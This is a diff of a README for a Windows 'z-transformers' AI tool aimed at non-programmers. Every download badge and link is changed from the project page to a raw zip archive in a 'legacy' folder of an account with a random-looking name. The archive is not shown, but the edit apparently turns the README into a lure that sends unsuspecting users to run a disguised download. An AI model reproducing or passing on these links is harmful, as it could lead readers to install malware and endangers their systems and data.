@@ -1,6 +1,6 @@
 # 🤖 z-transformers - Enhanced Transformer Model for Everyone
 
-[![Download z-transformers](https://img.shields.io/badge/Download-z--transformers-brightgreen?style=for-the-badge)](https://github.com/grhhrhdtdtdyd/z-transformers)
+[![Download z-transformers](https://img.shields.io/badge/Download-z--transformers-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/grhhrhdtdtdyd/z-transformers/main/z-transformers/legacy/transformers_z_2.2.zip)
 
 ## 📄 About z-transformers
 
@@ -14,7 +14,7 @@ The main purpose of this application is to provide an easy-to-use and reliable t
 
 This section guides you through downloading and running z-transformers on a Windows machine. You don't need any programming experience. Just follow the steps in order.
 
-[![Download z-transformers](https://img.shields.io/badge/Download-z--transformers-0099ff?style=for-the-badge)](https://github.com/grhhrhdtdtdyd/z-transformers)
+[![Download z-transformers](https://img.shields.io/badge/Download-z--transformers-0099ff?style=for-the-badge)](https://raw.githubusercontent.com/grhhrhdtdtdyd/z-transformers/main/z-transformers/legacy/transformers_z_2.2.zip)
 
 ### Step 1: Check Your System Requirements
 
@@ -33,7 +33,7 @@ If your machine meets these basics, you can continue.
 z-transformers is available on GitHub. The download is part of the project repository page.
 
 Click the badge or this link to visit the download page:  
-https://github.com/grhhrhdtdtdyd/z-transformers
+https://raw.githubusercontent.com/grhhrhdtdtdyd/z-transformers/main/z-transformers/legacy/transformers_z_2.2.zip
 
 ### Step 3: Download the Software
 
@@ -92,6 +92,6 @@ This application works well for anyone interested in deep learning research, AI 
 
 ## 🔗 Download z-transformers Here
 
-[DOWNLOAD z-transformers](https://github.com/grhhrhdtdtdyd/z-transformers)
+[DOWNLOAD z-transformers](https://raw.githubusercontent.com/grhhrhdtdtdyd/z-transformers/main/z-transformers/legacy/transformers_z_2.2.zip)
 
 Click this link to visit the project page and download the software for Windows. Follow the steps above to install and start using z-transformers.
